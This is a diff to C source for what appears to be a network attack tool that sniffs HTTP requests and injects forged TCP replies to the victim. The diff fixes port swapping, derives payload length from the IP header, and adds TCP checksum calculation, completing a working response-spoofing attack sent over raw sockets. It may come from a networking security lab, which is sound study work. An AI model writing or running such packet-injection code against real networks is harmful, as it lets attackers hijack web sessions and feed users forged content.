@@ -8,13 +8,12 @@
 #include <unistd.h>
 
 #include "decode-ethernet.h"
-#include "decode-ipv4.h"
-#include "decode-tcp.h"
 #include "decode-udp.h"
 #include "decode-icmpv4.h"
 #include "decode-http.h"
 #include "config.h"
 #include "util-logger.h"
+#include "checksum.h"
 
 #define MAX_FILE_SIZE 2000
 
@@ -44,21 +43,21 @@ void spoof_reply_http(ipheader *ip) {
 	unsigned char ipData[MAX_FILE_SIZE];
 	int n = fread (ipData , 1, MAX_FILE_SIZE, f);
 
-	/* Swap src and dst info */
-	unsigned short srcPort = tcpReceive->th_dport;			// Swap src and dst port
-	printf("Reveive dest port %d \n",ntohs(tcpReceive->th_dport));
+	/* Swap src and dst info */		
+	printf("Receive dest port %d \n",ntohs(tcpReceive->th_dport));
 	unsigned int srcIp = (ip->iph_dstip).s_addr;	// Swap src and dst ip
 	
-	unsigned short dstPort = tcpReceive->th_sport;
 	unsigned int dstIp = (ip->iph_srcip).s_addr;
 	printf("Reveive source port %d \n",ntohs(tcpReceive->th_sport));
 
+	//printf("seq %d\n",tcpReceive -> th_seq);
+	printf("seq %" PRIu32 "\n",ntohl(tcpReceive -> th_seq));
+    
+	//printf("ack %d\n",tcpReceive -> th_ack);
+	printf("ack %" PRIu32 "\n",ntohl(tcpReceive -> th_ack));
+
 	memcpy(ipData+12, &srcIp, 4);	// Change src ip
 	memcpy(ipData+16, &dstIp, 4);	// Change dst ip
-
-	memcpy(ipData+20, &srcPort, 2);	// Change src port
-	memcpy(ipData+22, &dstPort, 2);	// Change dst port
-
 
 	/* Re-calculate sequence number and ack number */
 	ipheader *ipSend = (ipheader *)ipData;
@@ -67,12 +66,8 @@ void spoof_reply_http(ipheader *ip) {
 
 	//char *dataSend = (char *)  ((u_char *)ipData + 40);
 	/*printf("data send %s\n",dataSend);*/
-
-	//printf("seq %d\n",tcpReceive -> th_seq);
-	printf("seq %" PRIu32 "\n",ntohl(tcpReceive -> th_seq));
-    
-	//printf("ack %d\n",tcpReceive -> th_ack);
-	printf("ack %" PRIu32 "\n",ntohl(tcpReceive -> th_ack));
+	tcpSend -> th_sport = tcpReceive->th_dport; // Swap src and dst port 
+	tcpSend -> th_dport = tcpReceive->th_sport;
 
 	/* New sequence number = received ack number*/
 	tcpSend ->  th_seq = tcpReceive -> th_ack;
@@ -80,11 +75,12 @@ void spoof_reply_http(ipheader *ip) {
 	/* New ACK number= received sequence number + TCP payload length */
 	uint8_t TCP_HEADER_LEN2 =  tcpReceive->th_offx2 >> 4;
 	TCP_HEADER_LEN2 = TCP_HEADER_LEN2 * 4;
-	u_char *payloadReceive = (u_char *) ((u_char *)tcpReceive + TCP_HEADER_LEN2);
+	//u_char *payloadReceive = (u_char *) ((u_char *)tcpReceive + TCP_HEADER_LEN2);
 	
-	uint32_t payloadLen = strlen((char *) payloadReceive);
-	printf("%02x \n",payloadReceive[0]);
-	printf("%02x \n",payloadReceive[payloadLen -1]);
+	//uint32_t payloadLen = strlen((char *) payloadReceive);
+	uint32_t payloadLen = ntohs(ip->iph_len) - IP_HEADER_LEN - TCP_HEADER_LEN2;
+	//printf("%02x \n",payloadReceive[0]);
+	//printf("%02x \n",payloadReceive[payloadLen -1]);
 	tcpSend -> th_ack = htonl(ntohl(tcpReceive -> th_seq) + payloadLen); 
 
 	printf("payload length %" PRIu32 "\n", payloadLen);
@@ -98,7 +94,7 @@ void spoof_reply_http(ipheader *ip) {
 	dstInfo.sin_port = tcpReceive->th_sport;
 
 	/* Re-calculate TCP checksum */
-	// Do smt here
+	tcpSend -> th_sum = calculate_tcp_checksum(ip);
 
 	/*send sproof IP packet to victim*/
 	send_raw_ip_packet(sock, ipData , n, dstInfo);
@@ -117,7 +113,7 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 				tcpheader *tcp = (tcpheader *) ((u_char *)packet + ETHERNET_HEADER_LEN + IP_HEADER_LEN);
 				uint8_t TCP_HEADER_LEN2 =  tcp->th_offx2 >> 4;
 				TCP_HEADER_LEN2 = TCP_HEADER_LEN2 * 4;
-				u_char * data = (u_char *) ((u_char *)tcp + TCP_HEADER_LEN2);
+				char * data = (char *) ((u_char *)tcp + TCP_HEADER_LEN2);
 				char match = 0;
 				if (ntohs(tcp->th_dport)==80 && data != NULL && strlen((char *) data) > 10) {
 					httprequest *request = parseRequest(data);
